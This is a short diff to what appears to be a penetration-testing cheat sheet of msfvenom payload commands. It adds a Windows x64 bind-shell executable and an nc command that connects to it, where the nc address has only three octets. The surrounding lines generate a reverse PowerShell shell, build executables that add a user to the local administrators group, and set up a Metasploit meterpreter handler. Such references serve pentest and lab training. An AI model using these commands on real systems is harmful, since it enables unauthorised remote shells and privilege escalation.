@@ -1567,6 +1567,10 @@ msfvenom -p cmd/windows/reverse_powershell LHOST=&lt;LHOST&gt; LPORT=4444 -o tas
 msfvenom -a x86 --platform Windows -p windows/exec CMD='net localgroup administrators username /add' -f exe > payload.exe
 msfvenom -a x64 --platform Windows -p windows/x64/exec CMD='net localgroup administrators username /add' -f exe -o payload.exe
 
+# windows bind shell
+msfvenom -p windows/x64/shell_bind_tcp LHOST=0.0.0.0 LPORT=4440 -f exe -o shell.exe
+nc 10.10.101 4440
+    
 # Metasploit Handler
 msf6 > use exploit/multi/handler
 msf6 > set payload windows/x64/meterpreter/reverse_tcp
